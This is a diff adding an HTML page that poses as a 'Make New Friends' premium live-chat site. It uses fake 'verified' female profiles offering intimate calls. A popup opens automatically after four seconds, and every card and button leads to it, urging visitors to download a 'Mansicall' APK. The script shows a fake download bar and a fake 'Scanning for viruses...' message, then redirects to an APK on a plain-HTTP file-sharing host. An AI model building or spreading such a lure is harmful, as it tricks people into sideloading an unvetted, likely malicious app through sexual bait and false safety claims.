@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Make New Friends - Premium Live Chat</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-pink: #d81b60;
+            --gradient-pink: linear-gradient(180deg, #e91e63 0%, #ad1457 100%);
+            --bg-color: #fce4ec;
+        }
+
+        body {
+            margin: 0; padding: 0;
+            font-family: 'Poppins', sans-serif;
+            background-color: var(--bg-color);
+            display: flex; flex-direction: column; align-items: center;
+        }
+
+        /* Header Layout - Exact same as Image */
+        header {
+            width: 100%; background: var(--gradient-pink);
+            padding: 25px 0; text-align: center; color: white;
+            border-bottom-left-radius: 30px; border-bottom-right-radius: 30px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2); position: relative;
+        }
+
+        .live-btn {
+            position: absolute; top: 20px; right: 20px;
+            background: #ff4444; padding: 4px 12px; border-radius: 20px;
+            font-size: 11px; font-weight: bold; border: 1.5px solid white;
+        }
+
+        .header-content h1 { margin: 0; font-size: 20px; letter-spacing: 0.5px; }
+        .header-content p { font-size: 12px; opacity: 0.85; margin-top: 5px; }
+
+        .container { width: 92%; max-width: 450px; padding: 20px 0; }
+
+        /* Models Section Header */
+        .section-title {
+            font-size: 16px; color: #444; margin-bottom: 15px;
+            display: flex; align-items: center; font-weight: 600;
+        }
+
+        /* Model Cards */
+        .models-list { background: white; border-radius: 25px; padding: 15px; }
+
+        .model-card {
+            display: flex; align-items: center; padding: 12px;
+            border: 1px solid #f8bbd0; border-radius: 18px; margin-bottom: 12px;
+            transition: 0.3s; cursor: pointer;
+        }
+
+        .img-box {
+            position: relative; width: 65px; height: 65px; margin-right: 15px;
+        }
+
+        .profile-img {
+            width: 100%; height: 100%; border-radius: 50%;
+            border: 2.5px solid #ff4081; object-fit: cover;
+            box-shadow: 0 0 8px rgba(216, 27, 96, 0.3);
+        }
+
+        .model-info { flex-grow: 1; }
+        .name { font-weight: 700; font-size: 16px; color: #333; }
+        .v-tick { color: #2196F3; font-size: 13px; }
+        .tag { background: #ffebee; color: #d81b60; font-size: 10px; padding: 2px 8px; border-radius: 10px; display: inline-block; margin: 3px 0; font-weight: 600; }
+        .status { font-size: 10px; color: #4CAF50; display: flex; align-items: center; }
+        .dot { height: 6px; width: 6px; background: #4CAF50; border-radius: 50%; margin-right: 5px; }
+
+        /* Call Button Style */
+        .call-action {
+            background: linear-gradient(135deg, #81c784, #4caf50);
+            width: 42px; height: 42px; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            color: white; box-shadow: 0 4px 10px rgba(76, 175, 80, 0.3);
+        }
+
+        /* Popup Box */
+        #popupOverlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8); display: none;
+            justify-content: center; align-items: center; z-index: 1000;
+            backdrop-filter: blur(5px);
+        }
+
+        .popup-box {
+            background: white; width: 85%; max-width: 320px;
+            padding: 25px; border-radius: 25px; text-align: center;
+            animation: zoomIn 0.3s ease;
+        }
+
+        @keyframes zoomIn { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+
+        .progress-bar { width: 100%; background: #eee; height: 8px; border-radius: 10px; margin: 15px 0; display: none; overflow: hidden; }
+        .progress-fill { width: 0%; height: 100%; background: #4CAF50; }
+
+        .btn-main {
+            background: var(--gradient-pink); color: white; border: none;
+            padding: 12px 20px; border-radius: 50px; width: 100%;
+            font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px;
+        }
+
+        footer { margin: 20px; color: #999; font-size: 10px; }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="live-btn">● LIVE</div>
+        <div class="header-content">
+            <h1>Make New Friends</h1>
+            <p>Connect with verified profiles instantly</p>
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="section-title">👥 Available Models (7)</div>
+
+        <div class="models-list">
+            <div class="model-card" onclick="openDownload()">
+                <div class="img-box">
+                    <img src="https://via.placeholder.com/150" class="profile-img">
+                </div>
+                <div class="model-info">
+                    <div class="name">Poorvika <span class="v-tick">✔</span></div>
+                    <div class="tag">Intimate Call Expert</div>
+                    <div class="status"><span class="dot"></span> Available Now</div>
+                </div>
+                <div class="call-action">📞</div>
+            </div>
+
+            <div class="model-card" onclick="openDownload()">
+                <div class="img-box">
+                    <img src="https://via.placeholder.com/150" class="profile-img">
+                </div>
+                <div class="model-info">
+                    <div class="name">Priya <span class="v-tick">✔</span></div>
+                    <div class="tag">Sweet Talk Expert</div>
+                    <div class="status"><span class="dot"></span> Available Now</div>
+                </div>
+                <div class="call-action">📞</div>
+            </div>
+
+            <div class="model-card" onclick="openDownload()">
+                <div class="img-box">
+                    <img src="https://via.placeholder.com/150" class="profile-img">
+                </div>
+                <div class="model-info">
+                    <div class="name">Anjali <span class="v-tick">✔</span></div>
+                    <div class="tag">Engaging Talk Star</div>
+                    <div class="status"><span class="dot"></span> Available Now</div>
+                </div>
+                <div class="call-action">📞</div>
+            </div>
+        </div>
+        
+        <center>
+            <button class="btn-main" style="width: 80%; margin-top: 25px;" onclick="openDownload()">INSTALL APP FOR MORE</button>
+        </center>
+    </div>
+
+    <div id="popupOverlay">
+        <div class="popup-box">
+            <h3 id="pTitle" style="color:var(--primary-pink); margin:0;">Video Call Restricted!</h3>
+            <p id="pText" style="font-size: 13px; color:#666;">Private calls ke liye Mansicall app install karein.</p>
+            
+            <div class="progress-bar" id="pBarCont"><div class="progress-fill" id="pFill"></div></div>
+            <p id="pStatus" style="font-size: 11px; color:#4CAF50; font-weight: bold;"></p>
+
+            <button class="btn-main" id="installBtn" onclick="triggerDownload()">DOWNLOAD APK (12.4 MB)</button>
+        </div>
+    </div>
+
+    <script>
+        // 4 sec baad auto popup
+        setTimeout(() => { openDownload(); }, 4000);
+
+        function openDownload() {
+            document.getElementById('popupOverlay').style.display = 'flex';
+        }
+
+        function triggerDownload() {
+            document.getElementById('installBtn').style.display = 'none';
+            document.getElementById('pBarCont').style.display = 'block';
+            document.getElementById('pTitle').innerText = "Downloading...";
+            
+            let w = 0;
+            let fill = document.getElementById('pFill');
+            let status = document.getElementById('pStatus');
+            
+            let inv = setInterval(() => {
+                if(w >= 100) {
+                    clearInterval(inv);
+                    status.innerText = "Download Complete! Installing...";
+                    // Update Link
+                    window.location.href = "http://hc1.checker.in/file2link/documents/file_497394.apk/Mansicall.apk"; 
+                } else {
+                    w++;
+                    fill.style.width = w + '%';
+                    if(w == 40) status.innerText = "Scanning for viruses...";
+                    if(w == 80) status.innerText = "Finalizing...";
+                }
+            }, 40);
+        }
+    </script>
+</body>
+  </html>
+          
